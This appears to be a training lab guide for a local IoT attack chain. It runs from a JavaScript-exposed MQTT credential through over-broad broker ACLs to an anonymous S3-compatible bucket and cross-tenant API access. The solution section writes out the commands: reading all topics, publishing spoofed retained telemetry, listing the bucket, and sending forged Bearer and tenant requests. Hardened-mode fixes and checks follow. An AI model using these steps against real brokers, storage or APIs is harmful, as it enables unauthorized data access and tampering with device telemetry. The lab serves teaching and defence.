# JS to MQTT to Storage to API Attack-Chain Lab

**Difficulty:** Advanced  
**Category:** IoT / Client-Side Credential Exposure / MQTT ACL / Object Storage / API Authorization

## STUDENT GUIDE

### Scenario and Learning Objectives

A warehouse operations dashboard consumes device telemetry, firmware metadata, and tenant-specific service data. The environment is represented entirely by local containers and synthetic records. Investigate how trust moves between the browser, broker, object storage, and API instead of treating each service as an independent issue.

By completing this lab, you should be able to:

- Trace a credential and service endpoint from a public frontend bundle to an MQTT client.
- Compare authentication with topic-level authorization for MQTT subscriptions and publications.
- Observe how unauthorized telemetry changes a simulated dashboard without controlling real equipment.
- Assess object listing and read permissions on an S3-compatible service.
- Distinguish API authentication from authorization and test tenant boundaries.
- Verify that broker ACLs, storage policies, and server-derived tenant identity interrupt the chain.

Authentication answers "Who are you?" Authorization answers "What are you allowed to access?" A valid identity must still be restricted to its tenant, devices, topics, and objects.

### Architecture

```text
Static dashboard -> Flask API <- local MQTT subscriber -> Mosquitto
                         |                                  |
                         +-> tenant-scoped synthetic data   +-> retained fake telemetry
                                                            +-> Moto-backed local S3 API gateway
```

The dashboard and backend run on Flask; Mosquitto provides MQTT and WebSocket listeners; Moto stores synthetic fixture files behind a path-style S3 API gateway. All host-published ports bind to loopback: dashboard/API `5100`, MQTT `18883`, MQTT WebSocket `18885`, and object storage `9900`. The Docker bridge is used by these lab services; application endpoints are fixed to the local stack and make no outbound requests. No real devices, AWS accounts, or real AWS credentials are involved; only synthetic S3 signing values are used against Moto.

### Prerequisites

- Docker Engine and Docker Compose v2.
- The first start pulls the pinned service images and builds the Flask image. Once those are cached, the lab does not need internet access.
- Optional for host-side MQTT testing: an MQTT client. The Mosquitto container already includes `mosquitto_sub` and `mosquitto_pub`.

### Start and Stop

From any working directory:

```sh
bash companion-labs/mqtt-storage-api-chain/start.sh vulnerable
curl -s http://127.0.0.1:5100/healthz
```

Open `http://127.0.0.1:5100` and inspect the dashboard and its static bundle. Stop the whole stack with:

```sh
bash companion-labs/mqtt-storage-api-chain/stop.sh
```

To stop and remove this lab's containers, network, and locally built image:

```sh
bash companion-labs/mqtt-storage-api-chain/clean.sh
```

### Scope and Safety Notice

Every password, API token, S3 signing key, device, IP address, certificate record, firmware file, tenant, and telemetry value is synthetic and local-only. The firmware and certificate fixtures are inert text. Broker and service ports are loopback-bound, and all state is disposable. Never replace the fixture values with credentials for a real service, point a client at an external broker, or connect this dashboard to real hardware.

### Student Challenge

Trace the frontend's data sources and identify which local services it trusts. Establish a baseline for the dashboard, then test the scope of the frontend's broker identity and compare that scope with the devices shown. Follow any service URLs found in telemetry into the local storage service. Finally, map the frontend's API calls and compare what the two synthetic tenants can see.

Demonstrate the smallest safe, local-only chain that changes displayed telemetry and retrieves synthetic infrastructure records. Then run the hardened configuration and show which controls stop each step. Record authentication separately from authorization in your findings.

### Hints

- Inspect the JavaScript returned under `/static/`; browser-delivered configuration is public to every visitor.
- MQTT credentials identify a client, but the broker ACL determines which topics it can read or write.
- Retained MQTT values make the baseline reproducible after a restart.
- A local object URL can reveal both objects and access-policy behavior; do not send it to any external host.
- The API's tenant selector is client-controlled in the request. Compare that with the identity and tenant that the server should derive from a verified token.

### Remediation

Do not treat a frontend secret as a secret. Give each MQTT client a unique identity and least-privilege topic ACLs; keep browser identities read-only and narrowly scoped, and validate topic-level access on every connection. Keep object buckets private and issue narrow, short-lived object access only when needed. Authenticate API requests with verifiable credentials, derive tenant membership on the server, and enforce tenant/object authorization for every endpoint. Apply TLS, credential rotation, quotas, audit logging, and broker/storage network segmentation in real deployments.

### Verification

The application unit tests run in the backend container:

```sh
docker compose -f companion-labs/mqtt-storage-api-chain/docker-compose.yml \
  run --no-deps --rm backend python -m unittest -v
```

For end-to-end verification, use the commands in the Maintainer / Solution Guide, then switch modes:

```sh
bash companion-labs/mqtt-storage-api-chain/stop.sh
bash companion-labs/mqtt-storage-api-chain/start.sh hardened
```

Confirm that the dashboard credential cannot read other devices or publish, unauthenticated telemetry and anonymous bucket listing/object reads fail, invalid API tokens return `401`, cross-tenant requests return `403`, and each valid tenant token sees only its own telemetry and synthetic API data. Stop with `stop.sh`; the in-memory storage fixture is discarded with its container.

## MAINTAINER / SOLUTION GUIDE

### Intended Vulnerability Chain

The default dashboard bundle (`static/dashboard.js`) intentionally contains the training-only MQTT credential `dashboard` / `dashboard-lab-only` and an API token `tenant-a-demo-token`. The vulnerable broker ACL grants the dashboard identity `readwrite #`, allowing it to read telemetry across tenants and publish retained values such as an altered warehouse temperature. The Flask MQTT ingestor reflects allowed synthetic topics into `/api/telemetry`, and the dashboard renders those values as text.

The retained `warehouse/01/config` message exposes local S3 object and bucket-list URLs. At backend startup, `initialize_storage()` seeds the Moto-backed `warehouse-assets` bucket and applies an anonymous `ListBucket`/`GetObject` policy in vulnerable mode. The local path-style gateway makes the synthetic object listing and read behavior observable on port `9900`. No real secrets or executable firmware are stored there.

The API requires a non-empty Bearer token but treats any value as the same tenant-A reader. It then trusts `tenant` query input or `X-Tenant-ID` to select either synthetic tenant. The vulnerable telemetry endpoint is unauthenticated and returns every simulated topic. This demonstrates weak authentication and separate tenant authorization/isolation failures.

### Exact Local Demonstration

Inspect the exposed credential and baseline:

```sh
curl -s http://127.0.0.1:5100/static/dashboard.js
curl -s http://127.0.0.1:5100/api/telemetry
```

Read retained MQTT messages with the frontend credential. The command runs only inside this lab's broker container:

```sh
docker compose -f companion-labs/mqtt-storage-api-chain/docker-compose.yml \
  exec -T broker mosquitto_sub -h 127.0.0.1 -u dashboard -P dashboard-lab-only \
  -t '#' -v -C 6 -W 5
```

Publish an altered simulated temperature. Within a second, the dashboard's HTTP-backed telemetry panel shows the new value:

```sh
docker compose -f companion-labs/mqtt-storage-api-chain/docker-compose.yml \
  exec -T broker mosquitto_pub -h 127.0.0.1 -u dashboard -P dashboard-lab-only \
  -t warehouse/01/temperature -m '{"temperature_c":85,"unit":"C"}' -r
docker compose -f companion-labs/mqtt-storage-api-chain/docker-compose.yml \
  exec -T broker mosquitto_pub -h 127.0.0.1 -u dashboard -P dashboard-lab-only \
  -t warehouse/01/status -m '{"status":"ALERT","device_id":"warehouse-01"}' -r
curl -s http://127.0.0.1:5100/api/telemetry
```

Follow the telemetry URL to list and read the synthetic bucket:

```sh
curl -s 'http://127.0.0.1:9900/warehouse-assets?list-type=2'
curl -s http://127.0.0.1:9900/warehouse-assets/firmware/warehouse-v2.bin
```

Any non-empty Bearer token plus the client-selected tenant exposes tenant B in vulnerable mode:

```sh
curl -s 'http://127.0.0.1:5100/api/warehouse/details?tenant=tenant-b' \
  -H 'Authorization: Bearer made-up-local-value' -H 'X-Tenant-ID: tenant-b'
curl -s 'http://127.0.0.1:5100/api/devices?tenant=tenant-b' \
  -H 'Authorization: Bearer made-up-local-value'
```

### Why the Vulnerabilities Exist and the Hardened Configuration

- `acl-vulnerable` grants the exposed `dashboard` MQTT identity `readwrite #`. `acl-hardened` limits it to reading `warehouse/01/#`; publish and other-topic access are denied. The separate backend `ingestor` identity remains scoped to the synthetic fleet topics it needs.
- The Flask startup code applies a Moto bucket policy allowing anonymous `ListBucket` and `GetObject` in vulnerable mode. `storage_gateway.py` exposes only those path-style S3 operations for the training bucket and returns `403` for anonymous requests in hardened mode. Hardened startup also removes the bucket policy while preserving fixture objects.
- In vulnerable mode, `api_identity()` accepts any non-empty Bearer value and `tenant_for_request()` honors client-controlled tenant context. The telemetry API is also unauthenticated and returns all topics. Hardened mode recognizes only the two fixed dummy tokens, rejects tenant selection that differs from the verified identity's tenant, and scopes telemetry to the identity's tenant.
- `docker-compose.hardened.yml` changes the ACL mount and sets `LAB_MODE=hardened` for the Flask backend (including storage initialization) and S3 API gateway. It does not disable the local services or alter the static demonstration bundle; exposed frontend values must be treated as public even after backend controls are corrected.

Verify MQTT read/publish denial and local API behavior:

```sh
bash companion-labs/mqtt-storage-api-chain/stop.sh
bash companion-labs/mqtt-storage-api-chain/start.sh hardened

curl -s http://127.0.0.1:5100/api/telemetry
curl -i 'http://127.0.0.1:5100/api/devices?tenant=tenant-b' \
  -H 'Authorization: Bearer tenant-a-demo-token'
curl -i http://127.0.0.1:5100/api/devices \
  -H 'Authorization: Bearer made-up-local-value'
curl -i 'http://127.0.0.1:9900/warehouse-assets?list-type=2'
```

The cross-tenant request returns `403`, fabricated API tokens and unauthenticated telemetry requests return `401`, and anonymous Moto S3 access is denied. The tenant-A dashboard token sees warehouse topics only; the tenant-B training token sees inventory topics only. A publish with the dashboard credential is denied by the broker ACL; verify the tenant-A temperature stays at its baseline value. Run `bash companion-labs/mqtt-storage-api-chain/clean.sh` to remove the containers and local image.
